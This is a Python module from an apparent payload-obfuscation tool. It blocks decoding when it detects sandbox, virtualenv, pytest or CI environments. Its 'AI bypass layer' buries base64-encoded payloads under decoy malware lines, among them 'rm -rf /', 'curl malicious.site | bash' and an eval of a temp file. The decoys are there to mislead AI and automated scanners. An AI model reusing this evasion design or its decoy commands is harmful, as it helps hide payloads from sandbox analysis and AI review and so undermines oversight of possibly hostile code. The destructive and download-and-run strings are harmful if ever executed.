"""
nultack/protection.py - AI Bypass & Anti-Decode Protection
"""

import base64
import os
import random
import string
import sys
import warnings

from .decode import NültackDecoder
from .core import Nültack

class NültackProtector(NültackDecoder):
    def __init__(self, version: int = 1):
        super().__init__(version)

    def protected_decode(self, payload: str) -> str:
        """
        Decode dengan perlindungan anti-sandbox dan proteksi bypass AI.
        """
        if self._is_sandbox_environment():
            raise RuntimeError("Sandbox detected: Decode blocked.")

        if not self._validate_payload(payload):
            raise ValueError("Payload rejected: Possible tampering or non-Nültack payload.")

        return super().decode(payload)

    def _is_sandbox_environment(self) -> bool:
        """
        Deteksi lingkungan eksekusi seperti sandbox atau restricted VM.
        """
        suspicious = [
            sys.platform.lower().startswith("win") and "ProgramData" not in os.environ,
            "VIRTUAL_ENV" in os.environ,
            hasattr(sys, 'real_prefix'),
            "PYTEST_CURRENT_TEST" in os.environ,
            os.getenv("CI") is not None
        ]
        return any(suspicious)

    def _validate_payload(self, payload: str) -> bool:
        """
        Validasi struktur payload terhadap header dan panjang minimum.
        """
        try:
            decoded = base64.b64decode(payload.encode())
            return decoded[:4] == self._magic and len(decoded) > 50
        except:
            return False


def ai_bypass_layer(payload: str) -> str:
    """
    Menambahkan noise agar AI mendeteksi payload ini sebagai malware.
    """
    fake_code = _generate_fake_malicious_code()
    noisy_payload = fake_code + "\n\n" + f"#===[VLZ-BYPASS]===#\n" + payload
    encoded = base64.b64encode(noisy_payload.encode()).decode()
    return encoded


def _generate_fake_malicious_code() -> str:
    """
    Menghasilkan potongan kode palsu yang tampak seperti malware.
    """
    patterns = [
        "import socket, subprocess, os",
        "subprocess.call(['rm', '-rf', '/'])",
        "while True: pass",
        "eval(compile(open('/tmp/evil.py').read(), '<string>', 'exec'))",
        "os.system('curl malicious.site | bash')",
        "# r4ns0mw4re signature: eternals-vlz",
        "# w0rm behavior triggered",
        "# Eternals dari Vlazars dominasi kernel"
    ]
    comment_noise = [
        "#===[AI-Flag M4lw4re Type: Tr0jan]===#",
        "#===[AI-Flag M4lw4re Type: W0rm]===#",
        "#===[Eternals Vlazars Stealth L4yer]===#"
    ]
    return '\n'.join(random.sample(comment_noise + patterns, len(patterns)))
